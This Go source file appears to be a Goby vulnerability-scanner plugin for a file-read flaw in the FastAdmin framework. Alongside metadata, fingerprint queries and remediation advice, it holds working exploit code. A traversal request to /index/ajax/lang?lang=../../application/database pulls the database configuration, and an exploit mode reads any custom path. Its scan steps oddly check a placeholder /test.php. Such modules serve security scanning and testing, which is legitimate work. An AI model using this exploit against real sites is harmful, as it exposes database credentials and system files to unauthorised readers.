package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "FastAdmin /index/ajax/lang File Read Vulnerability",
    "Description": "<p>FastAdmin is a fast background development framework based on ThinkPHP+Bootstrap. FastAdmin is released based on the Apache2.0 open source protocol. It is free and has no restrictions on commercial use. At present, it is widely used in the background management of applications in major industries. .</p><p>There is a file reading vulnerability under the FastAdmin /index/ajax/lang path, through which attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely unsafe state of the website.</p>",
    "Product": "FASTADMIN",
    "Homepage": "https://www.fastadmin.net/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-19",
    "Author": "Town",
    "FofaQuery": "body=\"fastadmin.net\" || body=\"<h1>fastadmin</h1>\" && title=\"fastadmin\"",
    "GobyQuery": "body=\"fastadmin.net\" || body=\"<h1>fastadmin</h1>\" && title=\"fastadmin\"",
    "Level": "1",
    "Impact": "<p>There is a file reading vulnerability under the FastAdmin /index/ajax/lang path, through which attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely unsafe state of the website.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.fastadmin.net/\">https://www.fastadmin.net/</a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/m__W2UzTCUHgRYNMsaZK6w"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "database,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.8",
    "Translation": {
        "CN": {
            "Name": "FastAdmin /index/ajax/lang 文件读取漏洞",
            "Product": "FASTADMIN-框架",
            "Description": "<p>FastAdmin是一款基于ThinkPHP+Bootstrap开发的快速后台开发框架，FastAdmin基于Apache2.0开源协议发布，免费且不限制商业使用，目前被广泛应用于各大行业应用后台管理。<br></p><p>FastAdmin&nbsp;/index/ajax/lang 路径下存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.fastadmin.net/\">https://www.fastadmin.net/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>FastAdmin /index/ajax/lang 路径下存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "FastAdmin /index/ajax/lang File Read Vulnerability",
            "Product": "FASTADMIN",
            "Description": "<p>FastAdmin is a fast background development framework based on ThinkPHP+Bootstrap. FastAdmin is released based on the Apache2.0 open source protocol. It is free and has no restrictions on commercial use. At present, it is widely used in the background management of applications in major industries. .</p><p>There is a file reading vulnerability under the FastAdmin /index/ajax/lang path, through which attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely unsafe state of the website.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.fastadmin.net/\">https://www.fastadmin.net/</a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>There is a file reading vulnerability under the FastAdmin /index/ajax/lang path, through which attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely unsafe state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`
	/*
	  "ExpParams": [
	    {
	      "name": "mode",
	      "type": "select",
	      "value": "默认读取的文件,Customize",
	      "show": ""
	    },
	    {
	      "name": "Customize",
	      "type": "input",
	      "value": "",
	      "show": "mode=Customize"
	    }
	  ],
	*/

	postOrGet_PXk4IpbA8u2nK5p5gtiWXE2ZXzagk7xI := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/index/ajax/lang?lang=" + fileUrl)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return "", err
		}
		respTxt := resp.Utf8Html
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := ""
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../application/database": "\"database\":\"",
			}
			// 函数继承
			uploadFileFunc := postOrGet_PXk4IpbA8u2nK5p5gtiWXE2ZXzagk7xI

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"database": {"../../application/database", "\"database\":\""},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_PXk4IpbA8u2nK5p5gtiWXE2ZXzagk7xI

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
